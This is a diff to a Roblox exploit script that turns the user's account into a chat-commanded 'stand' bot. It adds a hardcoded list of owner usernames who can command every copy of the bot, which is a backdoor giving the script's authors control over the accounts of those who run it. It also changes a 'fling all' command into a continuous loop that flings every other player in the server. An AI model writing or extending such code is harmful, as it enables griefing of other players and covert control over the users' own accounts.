@@ -3,6 +3,9 @@ local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local VIM = game:GetService("VirtualInputManager")
 
+-- OWNERS (super admins)
+local OWNERS = {"flamingkid538", "krepahhh"}
+
 -- Get settings from _G
 local HOST_USERNAME = _G.HOST_USERNAME or "YourMainAccountHere"
 local OFFSET_RIGHT = _G.OFFSET_RIGHT or 2
@@ -45,12 +48,28 @@ local function getPlayerExact(username)
 	return nil
 end
 
+local function isOwner(username)
+	for _, ownerName in ipairs(OWNERS) do
+		if username == ownerName then return true end
+	end
+	return false
+end
+
 local host = getPlayerExact(HOST_USERNAME)
 local stand = Players.LocalPlayer
 
 if not stand then
 	warn("Executor couldn't detect LocalPlayer.")
 	return
+end
+
+-- Check if owners are in game and notify
+local ownersInGame = {}
+for _, ownerName in ipairs(OWNERS) do
+	local owner = getPlayerExact(ownerName)
+	if owner then
+		table.insert(ownersInGame, owner)
+	end
 end
 
 local whitelistedUsers = {}
@@ -144,7 +163,11 @@ local function sendChatMessage(text)
 end
 
 if host then
-	createUI("Stand Linked\nHost: " .. host.Name)
+	local statusText = "Stand Linked\nHost: " .. host.Name
+	if #ownersInGame > 0 then
+		statusText = statusText .. "\nOwners in game!"
+	end
+	createUI(statusText)
 	createWatermark()
 else
 	createUI("No Host Found")
@@ -272,7 +295,11 @@ local function removePose()
 end
 
 local function isAuthorized(player)
+	-- Owners have universal access
+	if isOwner(player.Name) then return true end
+	-- Host always has access
 	if player == host then return true end
+	-- Whitelisted users have access
 	return whitelistedUsers[player.Name] ~= nil
 end
 
@@ -387,12 +414,13 @@ local function endFling()
 	end
 end
 
-local function runFling(target)
+local function runFling(target, duration)
 	removePose()
 	currentFlingTarget = target
 	isFlinging = true
 	local elapsed = 0
-	while isFlinging and elapsed < 5 do
+	local flingDuration = duration or 5
+	while isFlinging and elapsed < flingDuration do
 		if not target or not target.Parent or not target.Character then break end
 		local before = tick()
 		SkidFling(target)
@@ -416,7 +444,7 @@ task.spawn(function()
 						mode = "idle"
 						isFrozen = false
 						createUI("Auto-Fling: " .. target.DisplayName)
-						runFling(target)
+						runFling(target, 5)
 						task.wait(7)
 						break
 					end
@@ -483,7 +511,7 @@ local function handleCommand(player, msg)
 	local args = string.split(msg, " ")
 	local cmd = args[1]
 
-	-- SKILL COMMANDS .1 .2 .3 .4
+	-- SKILL COMMANDS .1 .2 .3 .4 (tp IN FRONT before using)
 	if cmd == ".1" or cmd == ".2" or cmd == ".3" or cmd == ".4" then
 		local skillNum = string.sub(cmd, 2)
 		local keyCode = skillKeys[skillNum]
@@ -502,7 +530,8 @@ local function handleCommand(player, msg)
 			local standHRP = stand.Character:FindFirstChild("HumanoidRootPart")
 			local controllerHRP = currentController.Character:FindFirstChild("HumanoidRootPart")
 			if standHRP and controllerHRP then
-				standHRP.CFrame = controllerHRP.CFrame * CFrame.new(0, 0, 3)
+				-- TP IN FRONT (negative Z)
+				standHRP.CFrame = controllerHRP.CFrame * CFrame.new(0, 0, -3)
 			end
 		end
 		task.wait(0.2)
@@ -589,6 +618,9 @@ local function handleCommand(player, msg)
 			task.wait(1.5)
 			standHRP.CFrame = CFrame.new(WALL_POSITION)
 			createUI("Stand sent to wall!")
+			task.wait(1)
+			sendToSky()
+			createUI("Stand: To sky!")
 		end)
 
 	elseif cmd == ".tpwall2" then
@@ -604,6 +636,9 @@ local function handleCommand(player, msg)
 			task.wait(1.5)
 			standHRP.CFrame = CFrame.new(WALL_POSITION)
 			createUI("Stand sent to wall!")
+			task.wait(1)
+			sendToSky()
+			createUI("Stand: To sky!")
 		end)
 
 	elseif cmd == ".tpwall3" then
@@ -619,6 +654,9 @@ local function handleCommand(player, msg)
 			task.wait(0.5)
 			standHRP.CFrame = CFrame.new(WALL_POSITION)
 			createUI("Stand sent to wall!")
+			task.wait(1)
+			sendToSky()
+			createUI("Stand: To sky!")
 		end)
 
 	elseif cmd == ".behind" then
@@ -677,38 +715,47 @@ local function handleCommand(player, msg)
 		local query = table.concat(args, " ", 2):lower()
 		if query == "" then createUI("Usage: .fling <name> or .fling all") return end
 
+		-- FLING ALL (auto loop)
 		if query == "all" then
 			if isFlingingAll then createUI("Fling All: Already running!") return end
-			local flingQueue = {}
-			for _, plr in ipairs(Players:GetPlayers()) do
-				if plr ~= host and plr ~= stand and not whitelistedUsers[plr.Name] then
-					if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-						table.insert(flingQueue, plr)
-					end
-				end
-			end
-			if #flingQueue == 0 then createUI("Fling All: No valid targets") return end
-			createUI("Flinging " .. #flingQueue .. " players...")
 			isFlingingAll = true
 			modeBeforeFling = mode
 			mode = "idle"
+			createUI("Fling All: Started!\nUse .stopfling to stop")
 			task.spawn(function()
-				for _, target in ipairs(flingQueue) do
-					if not isFlingingAll then break end
-					if target and target.Parent and target.Character then
-						createUI("Flinging: " .. target.DisplayName)
-						runFling(target)
-						task.wait(6)
+				while isFlingingAll do
+					local flingQueue = {}
+					for _, plr in ipairs(Players:GetPlayers()) do
+						-- Skip host, stand, owners, and whitelisted
+						if plr ~= host and plr ~= stand and not isOwner(plr.Name) and not whitelistedUsers[plr.Name] then
+							if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+								table.insert(flingQueue, plr)
+							end
+						end
 					end
+					if #flingQueue == 0 then
+						createUI("Fling All: No targets left")
+						isFlingingAll = false
+						break
+					end
+					for _, target in ipairs(flingQueue) do
+						if not isFlingingAll then break end
+						if target and target.Parent and target.Character then
+							createUI("Flinging: " .. target.DisplayName)
+							runFling(target, 3)
+							task.wait(4)
+						end
+					end
+					task.wait(1)
 				end
-				isFlingingAll = false
 				mode = modeBeforeFling
 				if mode == "follow" then applyPose() end
-				createUI("Fling All: Done!")
+				createUI("Fling All: Stopped")
 			end)
 			return
 		end
 
+		-- SINGLE TARGET FLING
 		if isFlinging then isFlinging = false task.wait(0.5) end
 		local target = findPlayer(query)
 		if not target then createUI("Fling: Player not found\n\"" .. query .. "\"") return end
@@ -720,14 +767,14 @@ local function handleCommand(player, msg)
 			mode = "idle"
 			isFrozen = false
 			createUI("BETRAYAL DETECTED!\nFlinging traitor: " .. player.DisplayName)
-			task.spawn(runFling, player)
+			task.spawn(runFling, player, 5)
 			return
 		end
 		modeBeforeFling = mode
 		mode = "idle"
 		isFrozen = false
 		createUI("Flinging: " .. target.DisplayName .. "\n5 seconds...")
-		task.spawn(runFling, target)
+		task.spawn(runFling, target, 5)
 
 	elseif cmd == ".stopfling" then
 		isFlinging = false
@@ -758,11 +805,11 @@ local function handleCommand(player, msg)
 		createUI("Stand: Spin Stopped")
 
 	elseif cmd == ".cmd" then
-		sendChatMessage(".summon .stop .orbit [n] .tp .tpwall1 .tpwall2 .wl [user] .unwl [user] .opp [user] .fling [user/all] .spin [n] .1 .2 .3 .4 .status .rj .re .script .ver")
+		sendChatMessage(".summon .stop .orbit [n] .tp .tpwall1 .tpwall2 .tpwall3 .wl [user] .unwl [user] .opp [user] .fling [user/all] .stopfling .spin [n] .1 .2 .3 .4 .status .rj .re .script .ver")
 		createUI("Command list sent to chat")
 		
 	elseif cmd == ".ver" then
-		sendChatMessage("Version 1.3.2")
+		sendChatMessage("Version 1.4.0")
 		createUI("Version sent to chat")
 
 	elseif cmd == ".script" then
@@ -835,16 +882,31 @@ host.Chatted:Connect(function(msg)
 	handleCommand(host, msg)
 end)
 
+-- Connect owner commands (they can control any bot)
+for _, owner in ipairs(ownersInGame) do
+	owner.Chatted:Connect(function(msg)
+		handleCommand(owner, msg)
+	end)
+end
+
 -- Connect all player commands
 Players.PlayerAdded:Connect(function(player)
-	player.Chatted:Connect(function(msg)
-		handleCommand(player, msg)
-	end)
+	-- Auto-connect owners
+	if isOwner(player.Name) then
+		player.Chatted:Connect(function(msg)
+			handleCommand(player, msg)
+		end)
+		createUI("Owner joined: " .. player.Name)
+	else
+		player.Chatted:Connect(function(msg)
+			handleCommand(player, msg)
+		end)
+	end
 end)
 
 -- Connect existing players
 for _, player in ipairs(Players:GetPlayers()) do
-	if player ~= host then
+	if player ~= host and not isOwner(player.Name) then
 		player.Chatted:Connect(function(msg)
 			handleCommand(player, msg)
 		end)
